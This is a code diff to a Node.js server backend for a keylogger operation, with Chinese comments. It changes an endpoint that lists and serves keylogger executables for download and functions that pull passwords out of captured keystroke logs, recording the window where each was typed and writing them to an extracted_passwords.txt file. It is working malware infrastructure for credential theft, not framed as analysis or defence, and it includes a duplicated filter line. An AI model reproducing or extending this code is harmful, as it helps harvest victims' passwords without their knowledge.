@@ -1468,79 +1468,54 @@ app.get('/api/clients', (req, res) => {
 });
 
 app.get('/api/update/get_version', asyncHandler(async (req, res) => {
+    const cacheKey = 'version_list';
     try {
-        // 从alist获取文件列表
-        let allFiles = [];
-        try {
-            allFiles = await alistClient.listFiles(alistClient.basePath);
-        } catch (alistError) {
-            logger.warn('Alist 连接失败，返回空版本列表', { error: alistError.message });
-            return res.json({
-                code: 200,
-                data: {
-                    versions: cached,
-                    count: cached.length
-                }
-            });
-        }
+        // 1. 先从 Alist 版本目录拉取文件
+        const allFiles = await alistClient.listFiles(CONFIG.alist.versionPath, true);
         
-        // 过滤出keylogger应用程序文件（假设文件名包含keylogger且为可执行文件）
         const keyloggerFiles = allFiles.filter(file => 
             file.filename.toLowerCase().includes('keylogger') && 
             (file.filename.endsWith('.exe') || file.filename.endsWith('.zip'))
         );
-        
-        // 提取版本号并生成下载链接
+
         const versions = [];
         for (const file of keyloggerFiles) {
-            // 从文件名提取版本号，假设格式为 keylogger_v1.0.0.exe 或类似
             const versionMatch = file.filename.match(/v(\d+\.\d+\.\d+)/i);
             if (versionMatch) {
                 const version = versionMatch[1];
-                const downloadUrl = `${alistClient.baseUrl}/d${alistClient.basePath}/${encodeURIComponent(file.filename)}`;
+                const downloadUrl = `${alistClient.baseUrl}/d${CONFIG.alist.versionPath}/${encodeURIComponent(file.filename)}`;
                 
-                // 尝试将版本信息存入数据库
-                try {
-                    // 检查数据库中是否已存在该版本
-                    const existingRows = await executeWithRetry(
-                        'SELECT id FROM client_versions WHERE version = ?',
-                        [version]
-                    );
-                    
-                    if (existingRows.length === 0) {
-                        // 插入新版本
-                        await executeWithRetry(
-                            'INSERT IGNORE INTO client_versions (version, download_url, is_active, force_update) VALUES (?, ?, ?, ?)',
-                            [version, downloadUrl, false, false]
-                        );
-                        logger.info(`添加新版本到数据库: ${version}`);
-                    }
-                } catch (dbError) {
-                    logger.warn('数据库操作失败，继续处理', { error: dbError.message });
-                }
-                
+                // 尝试写入数据库（幂等操作）
+                await executeWithRetry(
+                    'INSERT IGNORE INTO client_versions (version, download_url, is_active) VALUES (?, ?, FALSE)',
+                    [version, downloadUrl]
+                );
                 versions.push({ version, downloadUrl, filename: file.filename });
             }
         }
-        
-        return res.json({
-            code: 200,
-            data: {
-                versions,
-                count: versions.length
-            }
-        });
 
+        // 2. 缓存起来并返回
         versionCache.set(cacheKey, JSON.parse(JSON.stringify(versions)));
-
         logger.info(`版本列表生成完成，共 ${versions.length} 个版本`);
         return res.json({
             code: 200,
             data: { versions, count: versions.length }
         });
     } catch (error) {
-        logger.error('获取版本列表失败', { error: error.message });
-        return res.json({ code: 200, data: { versions: [], count: 0 } });
+        // 3. Alist 出错时，先尝试使用缓存，缓存也没有就返回空
+        logger.warn(`从Alist获取版本列表失败，尝试使用缓存`, { error: error.message });
+        const cached = versionCache.get(cacheKey);
+        if (cached && cached.length) {
+            return res.json({
+                code: 200,
+                data: { versions: cached, count: cached.length }
+            });
+        }
+        // 无缓存则返回空列表
+        return res.json({
+            code: 200,
+            data: { versions: [], count: 0 }
+        });
     }
 }));
 
@@ -1990,8 +1965,8 @@ function extractPasswordsFromLog(content, filename) {
                 passwords.push({
                     file: filename,
                     timestamp: timestamp || '未知',
-                    password: parsed,
-                    rawPassword: rawSequence.join(''),
+                    password: parsed || '',       // 防止 undefined
+                    rawPassword: rawSequence.join('').replace(/\n/g, '↵'),
                     window: currentWindow || '未知窗口'
                 });
             }
@@ -2184,7 +2159,9 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         }
     }
     uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
-
+    //丢弃密码为空的条目
+uniquePasswords = uniquePasswords.filter(item => item.password && item.password.trim() !== '');
+    uniquePasswords = uniquePasswords.filter(item => item.password && item.password.trim() !== '');
     const resultFilename = 'extracted_passwords.txt';
     const resultContent = uniquePasswords.map((item, index) => {
         return `${index + 1}. 来自: ${item.file}\n` +
